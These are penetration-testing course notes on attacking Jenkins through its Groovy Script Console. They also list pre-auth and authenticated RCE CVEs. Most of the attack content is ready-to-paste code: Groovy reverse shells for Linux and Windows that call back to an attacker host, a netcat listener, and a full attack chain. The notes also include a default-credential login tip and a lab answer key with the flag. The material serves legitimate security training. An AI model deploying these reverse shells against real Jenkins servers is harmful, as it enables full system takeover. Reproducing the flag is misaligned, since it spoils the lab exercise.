# Section 12 — Attacking Jenkins

## ID
903

## Module
Attacking Common Applications

## Kind
notes

## Title
Section 12 — Attacking Jenkins

## Description
Covers achieving RCE on Jenkins via the Groovy Script Console (Linux and Windows), reverse shell techniques, and notable Jenkins CVEs for pre-auth and authenticated code execution.

## Tags
jenkins, groovy, rce, script-console, reverse-shell, metasploit

## Commands
- `nc -lnvp <LPORT>`

## What This Section Covers
Once authenticated to Jenkins (even with weak/default creds), the built-in Script Console at `/script` allows arbitrary Groovy code execution within the Jenkins controller runtime. Since Jenkins frequently runs as `root` (Linux) or `SYSTEM` (Windows), this is a direct path to full system compromise — no exploit needed, just built-in functionality. The section also covers historical CVEs that allow unauthenticated or low-privilege RCE on older Jenkins versions.

## Methodology

### Script Console RCE (Linux)

1. Log in to Jenkins and navigate to **Manage Jenkins → Script Console** (or go directly to `http://<TARGET>:<PORT>/script`).
2. Run a quick command to confirm execution context and OS:
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```
3. For a reverse shell, start a listener (`nc -lnvp <LPORT>`) and execute the following Groovy in the Script Console:
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
4. Catch the shell and upgrade to interactive: `/bin/bash -i`.

### Script Console RCE (Windows)

1. Run commands with:
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```
2. For a Windows reverse shell, use the Java socket-based shell in Groovy:
```groovy
String host="<LHOST>";
int port=<LPORT>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
3. Alternatively, use a PowerShell download cradle with `Invoke-PowerShellTcp.ps1`, or add a user and connect via RDP/WinRM.

### Notable Jenkins CVEs

- **CVE-2018-1999002 + CVE-2019-1003000** — Pre-auth RCE chain: exploits dynamic routing to bypass the Overall/Read ACL, then bypasses the Groovy script security sandbox during compilation. Downloads and executes a malicious JAR. Works against Jenkins ≤ 2.137.
- **Jenkins 2.150.2** — Authenticated RCE via Node.js for users with JOB creation and BUILD privileges. If anonymous users are enabled, they have these privileges by default, making it effectively unauthenticated.
- Both are fixed in current LTS (2.303.1+), but older unpatched instances are common on internal networks.

## Multi-step Workflow (optional)
```
# Full attack chain — Linux target
# 1. Start listener
nc -lnvp 9001

# 2. In Jenkins Script Console (http://<TARGET>:8000/script), paste:
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/9001;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

# 3. Click Run — shell connects back
# 4. Upgrade shell
/bin/bash -i
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Attack the Jenkins target and gain RCE. Submit the contents of flag.txt in /var/lib/jenkins3 | f33ling_gr00000vy! | Login with `admin:admin`, navigate to Script Console (`/script`), execute Groovy reverse shell pointing to Pwnbox listener on port 9001, catch shell with `nc -lnvp 9001`, then `cat /var/lib/jenkins3/flag.txt` |

## Key Takeaways
- The Script Console is not a vulnerability — it's intended functionality. Any Jenkins admin can run arbitrary OS commands through it. This is why Jenkins admin access = system-level RCE.
- Groovy compiles to Java Bytecode and runs on JRE, so the same Groovy payloads work on any OS — only the shell command string changes (`/bin/bash` vs `cmd.exe`).
- The Metasploit module for Jenkins Script Console RCE also exists if you prefer automation.
- On internal pentests, Jenkins instances with `admin:admin`, no auth, or anonymous access with build privileges are surprisingly common — always check.
- Even on patched Jenkins (2.303.1+), the Script Console itself can't be "fixed" — it's a feature. The defense is proper access control (no weak creds, no anonymous access, restrict admin roles).

## Gotchas
- The flag is in `/var/lib/jenkins3/flag.txt`, not the Jenkins home directory you might expect (`/var/lib/jenkins`). Read the question carefully.
- The Groovy reverse shell hangs the Script Console page until the connection drops — this is expected behavior, not a failure.
- On Windows targets, `cmd.exe /c` is required to run commands — without `/c`, the process won't terminate and output won't return.
